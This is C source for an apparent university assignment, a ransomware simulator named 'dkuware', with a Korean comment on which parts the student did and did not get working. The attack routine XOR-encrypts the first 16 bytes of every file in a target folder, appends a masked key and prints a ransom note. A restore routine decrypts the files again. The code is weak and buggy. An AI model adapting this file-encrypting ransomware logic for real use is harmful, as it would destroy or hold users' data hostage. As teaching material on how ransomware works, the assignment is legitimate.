// 컴퓨터공학과 32184682 최재우

/*
구현 성공 :
[attack/restore thread 생성 및 관리]
[target directory  경로 탐색 후 접근]
[sample file 첫 16바이트 추출]
[mask 와 plaintext XOR 하여 ciphertext 생성]
[각 파일에 ciphertext overwrite 성공]
[password에서 16바이트 추출 및 부족한 영역은 0으로 패팅]
[각 파일에 encrypted_mask append]
[암호화 중 메시지 및 암호화 끝 출력물 출력]
[파일 복구 시 암호화 하여 overwrite한 부분 추출하여 decryption 성공 및 overwrite 성공]


구현 실패 :
[16바이트 랜덤 mask값 => 임의로 코드 내 지정함]
[openssl aes-128 사용 실패 -> XOR 암호화로 대체]
[각각 다른 파일로 분산하여 처리하는 과정 없이 dkuware.c에서 모든 과정 진행]
[encrypted_mask delete 실패]


"hw2를 하는 지금도 아직 중간고사가 끝나지 않았습니다. 그럼에도 최대한 많은 시간동안 고민하며
정석적인 결과물에 최대한 가까우려 노력했으나, 실패한 부분도 있고, 성공한 부분도 있었습니다.
또한 .jpg or .pdf 파일로 test한 것 이 아닌, .txt 파일로 실행해보며 과제를 진행하였습니다. 따라서
실제 .jpg or .pdf 파일에도 동일하게 적용되지 못할 수도 있을 것 같습니다.
11.2 수요일 수업을 들으며 교수님께서 수업시작에 말씀해주셨던 점이 기억에 남습니다.
이번에 부족한 제 과제였지만, 과제를 수행하며 많은 것을 인터넷에서 단순히 가져와 참고하여
사용하는 것이 아닌, 제 것으로 되어가는 느낌을 많이 받았습니다.

정말 많이 어려웠고, 막막했습니다. 그럼에도 후회하지않을만큼 노력을 했던 것 같고, 비록
과제의 결과에 부족한점이 많지만, 많은것을 배울 수 있었습니다. 감사합니다.
*/

#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/types.h>
#include <dirent.h>
#include <error.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#define _CRT_SECURE_NO_WARNINGS
#define MAXBUF 1024
char key[16] = {0, };
char zero[] = "0000000000000000000000000000000000000";
char buf[MAXBUF] = {0, };
char plaintext[16]={'\n'};
char ciphertext[16]={'\n'};
char encrypted_mask[16]={'\n'};
char decrypted_mask[16]={'\n'};
char text[MAXBUF];
int mask = 1001;

struct dirent *ent;
DIR *dir;
FILE *fp;

int filesize(const char *filename){   //calculate filesize

    	struct stat file_info;
	int sz_file;
	if ( 0 > stat( filename, &file_info)){
		return -1; // file이 없거나 에러
	}
	return file_info.st_size;
}

void XOR_cipher(int key, char text[]);
void XOR_decryption(int key, char cipher[]);
void XOR_mask(int mask, char key[]);
void XOR_demask(int mask, char cipherkey[]);

void *attack(void *param) { //1번 스레드 실행 함수
	//printf("attack thread\n");
	//printf("%s\n", key);
	if((dir = opendir ("./target")) != NULL){      //현재 directory 내의 하위 directory 중 target open
		while((ent = readdir(dir)) != NULL){   //target dir 내의 파일들을 순차적으로 탐색
			//printf("%s\n", ent->d_name);
			if((strcmp(ent->d_name, ".") == 0)||(strcmp(ent->d_name, "..") == 0)){
				continue;
			}
			char name [50] = "./target/";  //target dir 내의 파일들의 이름과 경로명을 합친 파일의 최종 경로명을 구해준다.
			strcat(name, ent->d_name);
			printf("[attack] %s\n", name);  //attack message print
			//printf("[%s]attack before size : %dbite\n", ent->d_name, filesize(name));  //attack 전 file size
			fp = fopen(name, "r+");   //fseek 를 위해 r(r+) mode open
			fread(plaintext,1,16,fp);  //plaintext 16바이트 추출
			XOR_cipher(mask,plaintext); //mask로 암호화
			XOR_mask(mask,key); //key의 암호화, OpenSSL AES-128 미 적용부분, 보완필요!
			//printf("plaintext : %s\n", plaintext);
			fseek(fp,0, SEEK_SET);  //덮어쓸 위치를 맨 앞으로 설정
			fwrite(ciphertext, 1, sizeof(ciphertext),fp);
			fclose(fp);
			fp = fopen(name, "a+");  //맨 뒤에 encrypted_mask 추가를 위해 a+ mode open
			fwrite(encrypted_mask,1,16,fp); //encryptedmask append
			//printf("encrypted_mask : %s\n", encrypted_mask);
			fclose(fp);
			//printf("[%s]attack aftere size :%dbite\n", ent->d_name, filesize(name));
		}
		closedir (dir);
		FILE* note_enc = fopen("note_enc.txt","r"); //ransome note print
		char buffer[MAXBUF] = {0, };
		fread(buffer, 1, MAXBUF, note_enc);
		printf("%s", buffer);
		fclose(note_enc);
	} else {
		pthread_exit(0);
	}
	pthread_exit(NULL); //1번 스레드 종료 (attack thread)
}

void *restore(void *param) { //2번 스레드 실행 함수 (restore)
	//printf("restore thread\n");
	if((dir = opendir ("./target")) != NULL){
                while((ent = readdir(dir)) != NULL){
                       // printf("%s\n", ent->d_name);
                        if((strcmp(ent->d_name, ".") == 0)||(strcmp(ent->d_name, "..") == 0)){
                                continue;
                        }
                        char name [50] = "./target/";
                        strcat(name, ent->d_name);
                        printf("[restore] %s\n", name);
                        //printf("[%s]restore before size : %dbite\n", ent->d_name, filesize(name));
                        fp = fopen(name, "r+");  //overwrite
                        fread(ciphertext,1,16,fp);
                        XOR_decryption(mask,ciphertext);  //ciphertext to plaintext decryption used mask
                        printf("ciphertext : %s\n", ciphertext);
                        fseek(fp,0, SEEK_SET);  //write 위치를 맨 앞으로 설정
                        fwrite(plaintext, 1, sizeof(plaintext),fp);  //overwrite
                        fseek(fp,-16,SEEK_END);
			char last16[16];
			fread(last16,1,16,fp);   //마지막 16byte 읽기까지 노력...
			//printf("last 16bytes : %s\n", last16);
                        //fwrite(encrypted_mask,1,16,fp); //encryptedmask append
                        fclose(fp);
                        //printf("[%s]restore aftere size :%dbite\n", ent->d_name, filesize(name));
                }
                closedir (dir);
		FILE* note_dec = fopen("note_dec.txt","r");  //note_dec ransome note print
                char buffer[MAXBUF*100] = {0, };
                fread(buffer, 1, MAXBUF*100, note_dec);
                printf("%s", buffer);
		fclose(note_dec);
        } else {
              	pthread_exit(0);
        }
	pthread_exit(NULL); //2번 스레드 종료
}

int main(int argc, char*argv[]) {
	char* attackk = "attack";
	char* restoree = "restore";
	pthread_t f;      //function pointer variable

	if(argc != 3)  //입력인자부족상황
	{
		printf("error 1\n");
		exit(1);
	}
	if((strcmp(argv[1], attackk) != 0) && (strcmp(argv[1], restoree) != 0) ) //입력인자 오류 확인
	{
		//printf("strcmp(argv[1], attack) : %d, strcmp(argv[1], restore) : %d\n", strcmp(argv[1], attackk), strcmp(argv[1], restoree));
		exit(2);
	}

        strcpy(buf, argv[2]);
        //printf("buf strlen : %ld\n", strlen(buf));
        int size  = strlen(buf);
       // printf("key : %s\n", key);
       // printf("buf : %s\n", buf);
        if(size < 16){                                   //password 의 크기에 따른 0 패팅 또는 삭제 과정.
                strncat(key, buf, size);
       //         printf("size < 16, key : %s\n", key);
                strncat(key, zero, (16-size));
        }
        else if(size > 17){
                strncat(key, buf, 16);
        }
        else if(size == 16){
                strcpy(key, buf);
        }


        printf("%s\n", key);

	if(strcmp(argv[1], attackk) == 0)
	{
	//	printf("attack 실행\n");
		if(pthread_create(&f, NULL, attack, NULL) != 0) //1번 thread 생성
                {
			fprintf(stderr, "thread create error\n");
                        exit(1);
                }
	}
	else
	{
	//	printf("restore 실행\n");
        	if(pthread_create(&f, NULL, restore, NULL) != 0)  //2번 thread 생성
               	{
			fprintf(stderr, "thread create error\n");
                        exit(1);
                }
	}

	pthread_join(f, NULL); //스레드 자원 회수

	return 0;
}

void XOR_cipher(int mask, char text[])   //plaintext to cipher text function
{
        int i, length;
        length=strlen(text);

        //printf("plaintext: %s \n", text);
        for(i=0;i<length;i+=1)
        {
                ciphertext[i]=text[i]^mask;                                 //key값으로 암호화하는 과정
        }
        printf("encrypted_mask : %s\n\n", ciphertext);
        //XOR_decryption(mask, ciphertext);                         //복호화 함수 호출
}

void XOR_decryption(int mask, char ciphertext[])  //cipher text to plaintext function
{
        int i, length;
        length=strlen(ciphertext);

        //printf("encrypted_mask : %s\n", ciphertext);
        for(i=0;i<length;i+=1)
        {
                plaintext[i]=ciphertext[i]^mask;                                 //key값으로 복호화하는 과정
        }
        printf("decrypted_mask: %s\n", plaintext);
}

void XOR_mask(int mask, char key[])   //key mask XOR
{
        int i, length;
        length=strlen(key);

        printf("key : %s \n", key);
        for(i=0;i<length;i+=1)
        {
                encrypted_mask[i]=key[i]^mask;                     //key값으로 암호화하는 과정
        }
        printf("encrypted key : %s\n\n", ciphertext);
        //XOR_decryption(mask, ciphertext);                         //복호화 함수 호출
}

void XOR_demask(int mask, char cipherkey[])
{
        int i, length;
        length=strlen(cipherkey);

        printf("암호문 : %s\n", cipherkey);
        for(i=0;i<length;i+=1)
        {
                decrypted_mask[i]=cipherkey[i]^mask;                                 //key값으로 복호화하는$
        }
        printf("복호화 : %s\n", decrypted_mask);
}
